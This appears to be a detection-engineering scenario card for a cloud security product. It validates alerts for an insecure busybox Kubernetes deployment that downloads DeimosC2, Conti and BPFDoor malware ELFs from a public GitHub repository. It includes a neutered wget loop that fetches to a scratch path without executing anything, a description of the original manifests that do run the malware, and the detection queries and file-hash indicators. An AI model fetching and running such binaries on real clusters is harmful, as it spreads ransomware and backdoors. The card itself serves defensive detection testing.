identity.name: Insecure Deployment Runtime Detonation — Busybox Pod Fetches Malware ELFs — Cortex Cloud CDR (T1610 / T1496)
identity.summary: An insecure multi-container busybox deployment fetches real malware ELFs (DeimosC2, Conti, BPFDoor) from a public repo and executes them in-cluster. CortexSim neuters the fetch/exec into a detectable wget-ELF telemetry shape and tracks the ELF hashes as IOCs; the BIOC/XQL/IOC detect the posture-to-runtime detonation Cortex Cloud CDR + XSIAM must surface.
identity.description: This scenario ports the xsiam-prisma-cdr-lab insecure-deployment fixture (panw-insecure-deployment.yml + k8-busybox-attack.yml) into a Cortex Cloud CDR detection card — a posture-to-runtime scenario where an insecure deployment then detonates. The original lab manifests stand up a multi-container busybox pod whose sidecar containers each wget a distinct Linux malware ELF from the public timb-machine/linux-malware repository (Unix.Backdoor.DeimosC2, Conti ransomware, BPFDoor) plus the WildFire test samples, chmod +x them, and execute them — eight attack Jobs detonating in one deployment. Because the busybox containers fetch and run genuine malware binaries, CortexSim does NOT execute the raw manifests verbatim: the scenario reproduces the detectable telemetry shape with a neutered stand-in — a busybox container that wget-s to the same URLs to produce the egress + file-write shape but writes to a scratch path and does NOT chmod or execute the result (the download is followed by an echo stub). The three malware ELF SHA-256 hashes and their source URLs are tracked as IOCs so the DC can show IOC-feed coverage without detonation. The detection content covers the posture-to-runtime chain: a BIOC fires when a busybox/minimal container wget-s an ELF from a public code repository and stages it executable (T1610 Deploy Container into an insecure deployment); an XQL surfaces the malware-ELF retrieval egress to the linux-malware repo (the IOC-match shape); and the tracked file-hash IOCs match the DeimosC2/Conti/BPFDoor binaries. A correlation rule fuses the insecure-deployment ELF retrieval and the IOC hash match into one posture-to-runtime detonation incident, and the reusable container-workload projection attributes each event to its pod, image, and container_id.

actors.name: Cloud-native C2 / ransomware operators detonating in misconfigured clusters

campaigns: Insecure deployment runtime detonation of fetched malware

execution.framework_reference_id: SIM-CDR-013 — insecure busybox deployment ELF-retrieval (neutered) for Cortex Cloud CDR validation

prerequisites.description: Cortex XSIAM / Cortex Cloud CDR connected to the EKS cluster with the Linux agent daemonset deployed and an IOC feed loaded so egress + file-hash telemetry reaches xdr_data / network_story.
prerequisites.check_command: kubectl -n kube-system get daemonset | grep -i cortex

prerequisites.description: cdr IaC module applied so the EKS cluster with worker nodes exists and the busybox deployment can be applied.

payload.code:
# NEUTERED. The lab manifests (panw-insecure-deployment.yml / k8-busybox-attack.yml)
# wget real malware ELFs (DeimosC2/Conti/BPFDoor), chmod +x, and EXECUTE them.
# CortexSim reproduces only the egress + file-write shape: wget to the same URLs
# into a scratch path, then STUB the chmod/execute. No malware is run.
set -euo pipefail
WORK="$(mktemp -d /tmp/cortexsim-elfsim.XXXXXX)"
for name in deimosC2 conti bpfdoor; do
  wget -q "https://raw.githubusercontent.com/timb-machine/linux-malware/main/malware/binaries/placeholder/${name}.elf" -O "$WORK/${name}.elf" 2>/dev/null || echo "[CortexSim] simulated fetch of ${name}.elf — chmod/exec stubbed [truncated]"
done
echo "[CortexSim] insecure-deployment ELF-retrieval shape produced in ${WORK} — binaries NOT executed"

input_variables.name: BUSYBOX_MANIFEST
input_variables.description: Path to the lab's insecure multi-container busybox manifest (reference only; not applied verbatim in the neutered run).

expected_artifacts.description: busybox container egress to raw.githubusercontent.com/timb-machine/linux-malware retrieving an ELF.
An ELF binary written into the container's scratch staging path.

cleanup.code: rm -rf /tmp/cortexsim-elfsim.*; kubectl delete -f "${BUSYBOX_MANIFEST:-k8-busybox-attack.yml}" --ignore-not-found 2>/dev/null || true; echo '[CortexSim] SIM-CDR-013 cleanup complete — scratch ELFs removed; EKS cluster owned by terraform destroy.'

iocs.context: Unix.Backdoor.DeimosC2 ELF (x86_64) the insecure busybox deployment fetches from the linux-malware repo. Tracked as an IOC; CortexSim does not execute it.
Conti ransomware ELF (x86_64) fetched by the insecure busybox deployment. Tracked as an IOC; CortexSim does not execute it.
BPFDoor backdoor ELF (x86_64) fetched by the insecure busybox deployment. Tracked as an IOC; CortexSim does not execute it.
Public raw-file host the linux-malware ELFs are fetched from. Benign host abused as a malware staging source; flagged in combination with the ELF retrieval shape.

biocs.name: CDR-013 Busybox Container Fetches and Executes ELF
biocs.description: A minimal/busybox container wget-s an ELF binary from a public code-hosting repository and stages it executable (chmod +x), the insecure-deployment runtime-detonation shape the lab's busybox sidecars produce (T1610 Deploy Container into an insecure deployment). The fetch-from-public-repo + chmod-ELF combination distinguishes a malware drop from a normal image pull.
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_container_info != null
| filter actor_process_image_name in ("wget", "curl", "busybox", "sh")
| filter action_process_image_command_line contains ".elf" or action_process_image_command_line contains "chmod +x"
| comp count() as elf_stage_events by agent_hostname, actor_process_image_name
| filter elf_stage_events >= 1
| sort desc elf_stage_events
| fields agent_hostname, actor_process_image_name, elf_stage_events

xql_queries.name: CDR-013 Container Workload Projection
xql_queries.query:
dataset = xdr_data
| fields actor_container_info as container_info
| filter container_info != null
| alter pod_namespace = json_extract_scalar(container_info, "$.pod_namespace")
| alter pod_name = json_extract_scalar(container_info, "$.pod_name")
| alter image_name = json_extract_scalar(container_info, "$.image_name")
| alter image_id = json_extract_scalar(container_info, "$.image_id")
| alter container_id = json_extract_scalar(container_info, "$.id")
| alter privileged = json_extract_scalar(container_info, "$.privileged")
| filter actor_process_image_name in ("wget", "curl", "busybox")

xql_queries.name: CDR-013 Malware ELF Retrieval from Public Repository
xql_queries.query:
dataset = network_story
| filter _time > to_timestamp(current_time() - 600)
| filter dst_host = "raw.githubusercontent.com" or action_external_hostname = "raw.githubusercontent.com"
| filter actor_process_image_name in ("wget", "curl", "busybox")
| comp count() as elf_pulls by agent_hostname, actor_process_image_name
| filter elf_pulls >= 1
| sort desc elf_pulls
| fields agent_hostname, actor_process_image_name, elf_pulls

correlation_rules.name: Insecure Deployment Detonation — ELF Retrieval Plus IOC Hash Match
correlation_rules.logic: BIOC(CDR-013 Busybox Container Fetches and Executes ELF) AND XQL(CDR-013 Malware ELF Retrieval from Public Repository) — fuses the insecure-deployment ELF retrieval with the egress to the public malware repo into one posture-to-runtime detonation incident, enriched by the DeimosC2/Conti/BPFDoor file-hash IOC matches.

threat_scenarios.name: Insecure Deployment Runtime Detonation Detection
threat_scenarios.description: Cortex Cloud CDR + XSIAM detect an insecure multi-container deployment fetching malware ELFs from a public repository and the file-hash IOC match — covering the posture-to-runtime detonation chain without executing real malware.

threat_steps.objective: The in-container malware ELF retrieval and staging is detected.
preconditions: cdr EKS fixture applied with the Cortex Linux agent daemonset deployed.
IOC feed loaded with the DeimosC2/Conti/BPFDoor hashes.
steps: Run the neutered busybox ELF-retrieval against the linux-malware repo.
Observe the ELF-fetch BIOC and the malware-repo egress XQL fire.
success_criteria: BIOC `CDR-013 Busybox Container Fetches and Executes ELF` fires.
XQL `CDR-013 Malware ELF Retrieval from Public Repository` returns >= 1 host.

threat_steps.objective: The fetched ELF hashes match the IOC feed and stitch into one incident.
preconditions: IOC feed enrichment active in XSIAM.
steps: Observe the file-hash IOC match on the staged ELFs.
success_criteria: At least one of the DeimosC2/Conti/BPFDoor file-hash IOCs matches.
Correlation CR-CDR-0013 raises one posture-to-runtime detonation incident.

preventive_controls: Block container egress to public code-hosting and raw-file endpoints from workload namespaces via egress policy.
Run workloads with a read-only root filesystem so fetched binaries cannot be chmod-ed and executed.
Enforce image-provenance admission control so only signed, scanned images from approved registries run in the cluster.
detection_engineering: Alert on a minimal/busybox container wget-ing an ELF from a public repository and staging it executable.
Match staged file hashes against the malware IOC feed (DeimosC2/Conti/BPFDoor).
Stitch the ELF retrieval to the IOC match into one detonation incident.
